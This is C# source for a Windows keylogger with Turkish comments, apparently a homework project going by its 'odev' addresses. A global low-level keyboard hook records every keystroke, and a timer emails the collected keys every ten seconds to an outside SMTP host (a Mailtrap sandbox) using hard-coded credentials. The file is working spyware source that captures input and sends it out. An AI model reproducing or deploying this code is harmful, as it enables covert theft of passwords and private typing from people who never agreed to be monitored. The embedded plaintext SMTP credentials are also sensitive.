using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        // --- 1. DEĞİŞKENLER ---
        private static StringBuilder loglar = new StringBuilder();
        private System.Windows.Forms.Timer mailZamanlayici = new System.Windows.Forms.Timer();

        // Klavye dinleme (Hook) kodları
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent();

            // Program başlar başlamaz klavyeyi dinlemeye al
            _hookID = SetHook(_proc);

            // 10 Saniyelik zamanlayıcıyı başlat
            mailZamanlayici.Interval = 10000; // 10000 ms = 10 saniye
            mailZamanlayici.Tick += MailZamanlayici_Tick;
            mailZamanlayici.Start();
        }

        // --- 2. ZAMANLAYICI (HER 10 SANİYEDE BİR ÇALIŞIR) ---
        private void MailZamanlayici_Tick(object sender, EventArgs e)
        {
            // Eğer kaydedilmiş tuş varsa mail gönder
            if (loglar.Length > 0)
            {
                MailGonder(loglar.ToString());
                loglar.Clear(); // Gönderdikten sonra temizle
            }
        }

        // --- 3. MAIL GÖNDERME (SENİN BİLGİLERİNLE) ---
        private void MailGonder(string icerik)
        {
            try
            {
                // Görselden ve mesajından aldığım bilgiler:
                string smtpUser = "7893200a5bf7d7";
                string smtpPass = "05bb9b896c5267";
                string smtpHost = "sandbox.smtp.mailtrap.io";
                int smtpPort = 587;

                using (SmtpClient client = new SmtpClient(smtpHost, smtpPort))
                {
                    client.EnableSsl = true;
                    client.DeliveryMethod = SmtpDeliveryMethod.Network;
                    client.UseDefaultCredentials = false;
                    client.Credentials = new NetworkCredential(smtpUser, smtpPass);

                    MailMessage mail = new MailMessage();
                    mail.From = new MailAddress("keylogger@odev.com", "Odev Keylogger");
                    mail.To.Add("alici@odev.com");
                    mail.Subject = "Log Raporu - " + DateTime.Now.ToString("HH:mm:ss");
                    mail.Body = "Yakalanan Tuşlar:\n\n" + icerik;

                    client.Send(mail);
                }

                // Başarılı olursa bilgisayardan 'Bip' sesi gelir
                Console.Beep();
                System.Diagnostics.Debug.WriteLine("Mail Başarıyla Gönderildi!");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Mail Gönderme Hatası: " + ex.Message);
            }
        }

        // --- 4. KLAVYE DİNLEME MOTORU (DOKUNMA) ---
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                loglar.Append(((Keys)vkCode).ToString() + " ");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
            base.OnFormClosing(e);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}